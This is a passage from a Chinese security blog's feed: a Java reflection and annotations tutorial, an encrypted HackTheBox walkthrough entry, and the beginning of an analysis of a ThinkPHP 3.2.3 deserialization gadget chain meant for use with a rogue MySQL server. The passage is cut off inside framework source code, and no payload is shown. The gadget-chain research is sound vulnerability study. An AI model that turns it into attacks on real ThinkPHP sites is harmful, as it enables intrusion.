class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│package &#x3D; &quot;java.lang&quot;      │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│super &#x3D; &quot;java.lang.Object&quot; │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│interface &#x3D; CharSequence...│</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│field &#x3D; value[],hash,...   │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│method &#x3D; indexOf()...      │</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure><p>由于JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p><p>这种通过<code>Class</code>实例获取<code>class</code>信息的方法称为反射（Reflection）。</p><p>获取一个<code>class</code>的<code>Class</code>实例有三种方法：</p><p>方法一：直接通过一个<code>class</code>的静态变量<code>class</code>获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls &#x3D; String.class;</span><br></pre></td></tr></table></figure><p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的<code>getClass()</code>方法获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello&quot;;</span><br><span class="line">Class cls &#x3D; s.getClass();</span><br></pre></td></tr></table></figure><p>方法三：如果知道一个<code>class</code>的完整类名，可以通过静态方法<code>Class.forName()</code>获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls &#x3D; Class.forName(&quot;java.lang.String&quot;);</span><br></pre></td></tr></table></figure><h3 id="访问字段">访问字段</h3><p><code>Class</code>类提供了以下几个方法来获取字段：</p><ul><li>Field getField(name)：根据字段名获取某个public的field（包括父类）</li><li>Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</li><li>Field[] getFields()：获取所有public的field（包括父类）</li><li>Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）</li></ul><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113344.png" alt=""></p><p>一个<code>Field</code>对象包含了一个字段的所有信息：</p><ul><li><code>getName()</code>：返回字段名称，例如，<code>&quot;name&quot;</code>；</li><li><code>getType()</code>：返回字段类型，也是一个<code>Class</code>实例，例如，<code>String.class</code>；</li><li><code>getModifiers()</code>：返回字段的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li></ul><p>还是以上面这段代码为例：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113943.png" alt=""></p><h4 id="获取字段值">获取字段值</h4><p>利用反射拿到字段的一个<code>Field</code>实例之后，可以拿到一个实例对应的该字段的值：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115216.png" alt=""></p><p>如果不调用<code>Field.setAccessible(true)</code>，就会抛出一个<code>IllegalAccessException</code>的错误，这是因为<code>name</code>字段被定义成<code>private</code>。</p><h4 id="设置字段值">设置字段值</h4><p>除了使用get方法获取字段值，还可以用set方法获取字段值：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115646.png" alt=""></p><p>同样，修改非<code>public</code>字段，需要首先调用<code>setAccessible(true)</code>。</p><h3 id="调用方法">调用方法</h3><p><code>Class</code>类提供了以下几个方法来获取<code>Method</code>：</p><ul><li><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</li><li><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li></ul><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118121523.png" alt=""></p><p>一个<code>Method</code>对象包含一个方法的所有信息：</p><ul><li><code>getName()</code>：返回方法名称，例如：<code>&quot;getScore&quot;</code>；</li><li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例，例如：<code>String.class</code>；</li><li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组，例如：<code>&#123;String.class, int.class&#125;</code>；</li><li><code>getModifiers()</code>：返回方法的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li></ul><p>当我们获取到一个<code>Method</code>对象时，就可以对它进行调用。我们以下面的代码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello world&quot;;</span><br><span class="line">String r &#x3D; s.substring(6); &#x2F;&#x2F; &quot;world&quot;</span><br></pre></td></tr></table></figure><p>如果用反射来调用<code>substring</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145036.png" alt=""></p><h4 id="调用静态方法">调用静态方法</h4><p>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以<code>invoke</code>方法传入的第一个参数永远为<code>null</code>。以<code>Integer.parseInt(String)</code>为例：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145348.png" alt=""></p><h4 id="调用非public方法">调用非public方法</h4><p>和Field类似，对于非public方法，我们虽然可以通过<code>Class.getDeclaredMethod()</code>获取该方法实例，但直接对其调用将得到一个<code>IllegalAccessException</code>。为了调用非public方法，我们通过<code>Method.setAccessible(true)</code>允许其调用：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145724.png" alt=""></p><h4 id="多态">多态</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118150644.png" alt=""></p><p>一个<code>Person</code>类定义了<code>hello()</code>方法，并且它的子类<code>Student</code>也覆写了<code>hello()</code>方法，那么，从<code>Person.class</code>获取的<code>Method</code>，作用于<code>Student</code>实例时，同样会遵循多态原则，实际调用的是<code>Student</code>类的<code>hello()</code>方法。</p><h3 id="调用构造方法">调用构造方法</h3><p>Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118152642.png" alt=""></p><p>通过Class实例获取Constructor的方法如下：</p><ul><li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li><li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li></ul><h3 id="获取继承关系">获取继承关系</h3><h4 id="获取父类class">获取父类class</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118163859.png" alt=""></p><h4 id="获取interface">获取interface</h4><p>由于一个类可能实现一个或多个接口，通过<code>Class</code>我们就可以查询到实现的接口类型。例如，查询<code>String</code>实现的接口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118164136.png" alt=""></p><h3 id="动态代理">动态代理</h3><p><a href="https://www.jianshu.com/p/95970b089360">https://www.jianshu.com/p/95970b089360</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118170645.png" alt=""></p><p>在运行期动态创建一个<code>interface</code>实例的方法如下：</p><ol><li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</li><li>通过<code>Proxy.newProxyInstance()</code>创建<code>interface</code>实例，它需要3个参数：<ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li><li>需要实现的接口数组，至少需要传入一个接口进去；</li><li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li></ol></li><li>将返回的<code>Object</code>强制转型为接口。</li></ol><h2 id="0x02-注解">0x02 注解</h2><h3 id="常用的元注解">常用的元注解</h3><h4 id="Target">@Target</h4><p>使用<code>@Target</code>可以定义<code>Annotation</code>能够被应用于源码的哪些位置：</p><ul><li>类或接口：<code>ElementType.TYPE</code>；</li><li>字段：<code>ElementType.FIELD</code>；</li><li>方法：<code>ElementType.METHOD</code>；</li><li>构造方法：<code>ElementType.CONSTRUCTOR</code>；</li><li>方法参数：<code>ElementType.PARAMETER</code>。</li></ul><h4 id="Retention">@Retention</h4><p>元注解<code>@Retention</code>定义了<code>Annotation</code>的生命周期：</p><ul><li>仅编译期：<code>RetentionPolicy.SOURCE</code>；</li><li>仅class文件：<code>RetentionPolicy.CLASS</code>；</li><li>运行期：<code>RetentionPolicy.RUNTIME</code>。</li></ul><p>如果<code>@Retention</code>不存在，则该<code>Annotation</code>默认为<code>CLASS</code>。</p><h3 id="如何定义Annotation">如何定义Annotation</h3><p>我们总结一下定义<code>Annotation</code>的步骤：</p><p>第一步，用<code>@interface</code>定义注解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步，添加参数、默认值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把最常用的参数定义为<code>value()</code>，推荐所有参数都尽量设置默认值。</p><p>第三步，用元注解配置注解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Target(ElementType.TYPE)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，必须设置<code>@Target</code>和<code>@Retention</code>，<code>@Retention</code>一般设置为<code>RUNTIME</code>，因为我们自定义的注解通常要求在运行期读取。</p><h3 id="使用注解">使用注解</h3><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(min = 1, max = 20)</span></span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(max = 10)</span></span><br><span class="line"><span class="keyword">public</span> String city;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(min = 1, max = 100)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, String city, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.city = city;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;Person: name=%s, city=%s, age=%d&#125;&quot;</span>, name, city, age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Range.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Beijing&quot;</span>, <span class="number">20</span>);</span><br><span class="line">Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">20</span>);</span><br><span class="line">Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">199</span>);</span><br><span class="line"><span class="keyword">for</span> (Person p : <span class="keyword">new</span> Person[] &#123; p1, p2, p3 &#125;) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">check(p);</span><br><span class="line">System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked ok.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked failed: &quot;</span> + e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> IllegalArgumentException, ReflectiveOperationException </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">Range range = field.getAnnotation(Range.class);</span><br><span class="line"><span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">Object value = field.get(person);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="keyword">if</span> (value <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">String s = (String) value;</span><br><span class="line"><span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max())&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid name&quot;</span> + field.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Integer)&#123;</span><br><span class="line">Integer i = (Integer) value;</span><br><span class="line"><span class="keyword">if</span> (i &lt; range.min() || i &gt; range.max())&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid age&quot;</span> + field.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person &#123;Person: name=Bob, city=Beijing, age=<span class="number">20</span>&#125; checked ok.</span><br><span class="line">Person &#123;Person: name=, city=Shanghai, age=<span class="number">20</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid namename</span><br><span class="line">Person &#123;Person: name=Alice, city=Shanghai, age=<span class="number">199</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid ageage</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java基础学习之反射和注解&quot;&gt;Java基础学习之反射和注解&lt;/h1&gt;
&lt;p&gt;Reference: &lt;a href=&quot;https://liaoxuefeng.com&quot;&gt;https://liaoxuefeng.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-反射&quot;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="java" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"/>
    
    
      <category term="java" scheme="http://ca0y1h.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Doctor-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough/</id>
    <published>2021-01-22T13:23:10.000Z</published>
    <updated>2021-01-31T04:08:43.779Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fb043ad81f0c53c870662d070af0314825921d4b2bdae224f6304c2bb5f15d29"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>TP3.0反序列化POP链+MySQL伪造恶意服务端</title>
    <link href="http://ca0y1h.top/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    <id>http://ca0y1h.top/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF/</id>
    <published>2021-01-21T07:06:32.000Z</published>
    <updated>2021-01-21T07:07:48.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TP3-0反序列化POP链-MySQL伪造恶意服务端">TP3.0反序列化POP链+MySQL伪造恶意服务端</h1><blockquote><p>Reference: 米斯特安全团队 <a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p></blockquote><h2 id="测试环境">测试环境</h2><ul><li>OS: <code>MAC OS</code></li><li>PHP: <code>5.6.40</code></li><li>ThinkPHP: <code>3.2.3</code></li></ul><h2 id="环境搭建">环境搭建</h2><p>使用composer拉取源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;thinkphp&#x3D;3.2.3 tp3</span><br></pre></td></tr></table></figure><p>框架会生成一个默认的控制器，访问首页显示<code>欢迎使用ThinkPHP！</code>。</p><p>更改这个默认的控制器：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120114943.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115003.png" alt=""></p><h2 id="POP链分析">POP链分析</h2><h3 id="起点">起点</h3><p>文件：<code>/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115132.png" alt=""></p><p><code>img</code>参数可控，这里有两个思路，一是可以接着寻找<code>destroy()</code>函数，二是可以寻找不存在<code>destroy()</code>函数的类从而触发<code>__call()</code>方法。</p><h3 id="跳板1">跳板1</h3><p>首先还是全局查找<code>function destroy(</code>，找到一个可用的跳板类。</p><p>文件：<code>/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115536.png" alt=""></p><p>这里的<code>$this-&gt;handle</code>可控，并且调用了<code>$this-&gt;handle</code>的<code>delete()</code>方法，且传过去的参数是部分可控的，因此我们可以继续寻找有<code>delete()</code>方法的跳板类。</p><p>有点问题的地方在于这里的<code>destroy()</code>方法需要传入一个<code>$sessID</code>，但是前面<code>Imagick::__destruct</code>中调用<code>destroy()</code>方法的时候并没有传值，在PHP7的版本下会抛出异常。</p><h3 id="跳板2">跳板2</h3><p>全局搜索<code>function delete(</code>，找到一个<code>Model</code>类。</p><p>文件：<code>/ThinkPHP/Library/Think/Model.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">$options = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pk = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$pk])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[$pk]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($options) || is_string($options)) &#123;</span><br><span class="line">            <span class="comment">// 根据主键删除记录</span></span><br><span class="line">            <span class="keyword">if</span> (strpos($options, <span class="string">&#x27;,&#x27;</span>)) &#123;</span><br><span class="line">                $where[$pk] = <span class="keyword">array</span>(<span class="string">&#x27;IN&#x27;</span>, $options);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $where[$pk] = $options;</span><br><span class="line">            &#125;</span><br><span class="line">            $options          = <span class="keyword">array</span>();</span><br><span class="line">            $options[<span class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据复合主键删除记录</span></span><br><span class="line">        <span class="keyword">if</span> (is_array($options) &amp;&amp; (count($options) &gt; <span class="number">0</span>) &amp;&amp; is_array($pk)) &#123;</span><br><span class="line">            $count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (array_keys($options) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_int($key)) &#123;</span><br><span class="line">                    $count++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (count($pk) == $count) &#123;</span><br><span class="line">                $i = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">foreach</span> ($pk <span class="keyword">as</span> $field) &#123;</span><br><span class="line">                    $where[$field] = $options[$i];</span><br><span class="line">                    <span class="keyword">unset</span>($options[$i++]);</span><br><span class="line">                &#125;</span><br><span class="line">                $options[<span 